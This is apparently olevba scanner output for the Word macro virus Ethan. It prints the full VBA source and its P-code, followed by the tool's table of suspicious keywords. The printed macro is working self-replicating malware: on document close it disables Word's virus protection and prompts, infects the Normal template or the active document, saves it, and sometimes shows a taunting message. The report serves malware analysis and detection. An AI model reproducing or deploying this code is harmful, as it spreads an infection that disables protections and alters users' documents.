olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.dx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.dx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Version = 0.24
' Ďî÷ĺěó ňű íĺ ńęŕçŕë Áĺ-Áĺ ???
    On Error Resume Next
    s = ActiveDocument.Saved
    Application.EnableCancelKey = Not -1
    With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
    Randomize
        Open NormalTemplate.Path & "\Normal.dat" For Output As #1
        Open NormalTemplate.Path & "\License.dat" For Output As #2
        For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
            a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
            Print #1, a
            If i = 2 Then Print #2, a
        Next i
        Close #1
        Close #2
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
        If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 7) <> "Version" Then
            Set t = NormalTemplate.VBProject.VBComponents.Item(1)
        End If
    ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
        Set t = ActiveDocument.VBProject.VBComponents.Item(1)
    Else
        t = ""
    End If
    If t <> "" Then
        Open NormalTemplate.Path & "\Normal.dat" For Input As #1
        If LOF(1) = 0 Then GoTo q
        i = 1
        Do While Not EOF(1)
            Line Input #1, a
            t.CodeModule.InsertLines i, a
            i = i + 1
        Loop
q:      Close #1
        If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        If Rnd < 0.3 Then
            a = MsgBox("You are lamer? Press OK to confirm", vbOKOnly, "Windows NT")
        End If
    End If
    Kill NormalTemplate.Path & "\Normal.dat"
    If Rnd < 0.05 Then
        ActiveDocument.Content.InsertFile NormalTemplate.Path & "\License.dat"
        ActiveDocument.Save
    End If
    If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
    Kill NormalTemplate.Path & "\License.dat"
End Sub

Private Sub Document_New()
    a = MsgBox("Č çŕ÷ĺě ňĺáĺ ýňîň ďóńňîé ôŕéë ???", vbQuestion, "WindowsNT")
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.dx
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4049 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3FCE 
' 	St Version 
' Line #2:
' 	QuoteRem 0x0000 0x001E " Ďî÷ĺěó ňű íĺ ńęŕçŕë Áĺ-Áĺ ???"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #5:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #7:
' 	ArgsCall Read 0x0000 
' Line #8:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000B "\Normal.dat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #9:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000C "\License.dat"
' 	Concat 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #11:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #13:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' 	EndIf 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #16:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #18:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "Version"
' 	Ne 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	ElseIfBlock 
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	LitStr 0x0000 ""
' 	St t 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #27:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000B "\Normal.dat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #28:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #29:
' 	LitDI2 0x0001 
' 	St i 
' Line #30:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #32:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #34:
' 	Loop 
' Line #35:
' 	Label q 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #37:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	IfBlock 
' Line #38:
' 	LitStr 0x0022 "You are lamer? Press OK to confirm"
' 	Ld vbOKOnly 
' 	LitStr 0x000A "Windows NT"
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000B "\Normal.dat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #42:
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	Lt 
' 	IfBlock 
' Line #43:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000C "\License.dat"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	ArgsMemCall InsertFile 0x0001 
' Line #44:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #47:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x000C "\License.dat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub Document_New())
' Line #51:
' 	LitStr 0x0021 "Č çŕ÷ĺě ňĺáĺ ýňîň ďóńňîé ôŕéë ???"
' 	Ld vbQuestion 
' 	LitStr 0x0009 "WindowsNT"
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #52:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

